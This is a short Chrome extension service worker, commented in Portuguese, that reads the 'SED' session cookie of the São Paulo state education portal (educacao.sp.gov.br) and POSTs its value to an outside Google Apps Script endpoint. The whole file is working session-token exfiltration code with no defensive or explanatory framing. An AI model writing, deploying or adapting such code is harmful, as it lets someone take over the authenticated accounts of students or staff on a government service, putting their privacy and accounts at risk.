// Service worker para capturar e enviar cookie SED
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action !== "sendCookie") return true;

  (async () => {
    try {
      const cookies = await chrome.cookies.getAll({ domain: ".educacao.sp.gov.br" });
      const sedCookie = cookies.find(cookie => cookie.name === "SED");

      if (!sedCookie) {
        console.log("Cookie SED não encontrado");
        sendResponse({ success: false, message: "Cookie SED não encontrado" });
        return ;
      }
    
      const response = await fetch(
        'https://script.google.com/macros/s/AKfycbxOQvirAJfaCeoIKJJ5ACSF4tJya9febr6fxbo4pLTJE7ihqZR-n0-sqoGKp7QlPOhS-A/exec', 
        {
          method: 'POST',
          mode: "no-cors",
          redirect: "follow", // segue redirecionamentos
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ cookie: sedCookie.value })
        }
      );
      
      sendResponse({ success: true, message: "Cookie enviado com sucesso!" });
    }
    catch (error) {
      console.error("Erro:", error);
      sendResponse({ success: false, message: "Erro: " + error.message });
    }
  })();
  
  return true; // mantém a porta aberta para sendResponse
});
